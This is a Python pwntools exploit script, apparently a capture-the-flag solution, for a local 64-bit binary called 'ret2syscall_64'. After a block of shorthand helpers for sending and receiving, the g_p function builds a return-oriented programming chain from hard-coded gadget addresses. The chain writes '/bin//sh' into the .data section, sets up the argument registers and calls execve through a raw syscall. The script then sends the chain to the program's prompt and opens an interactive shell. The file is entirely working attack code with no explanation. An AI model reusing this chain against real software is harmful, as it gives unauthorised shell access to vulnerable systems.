from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./ret2syscall_64')
elf = ELF('./ret2syscall_64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def g_p():
	p = b'a'*0x10
	p += pack('<Q', 0x000000000040f21e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004c00e0) # @ .data
	p += pack('<Q', 0x0000000000449117) # pop rax ; ret
	p += b'/bin//sh'
	p += pack('<Q', 0x000000000047bb85) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040f21e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
	p += pack('<Q', 0x0000000000443770) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000047bb85) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004018c2) # pop rdi ; ret
	p += pack('<Q', 0x00000000004c00e0) # @ .data
	p += pack('<Q', 0x000000000040f21e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
	p += pack('<Q', 0x00000000004017cf) # pop rdx ; ret
	p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
	p += pack('<Q', 0x0000000000443770) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000449117) # pop rax ; ret
	p += pack('<Q', 0x000000000000003b) # 0x3b
	p += pack('<Q', 0x00000000004012d3) # syscall
	return p

sa(b'>>\n', g_p())

inter()
	
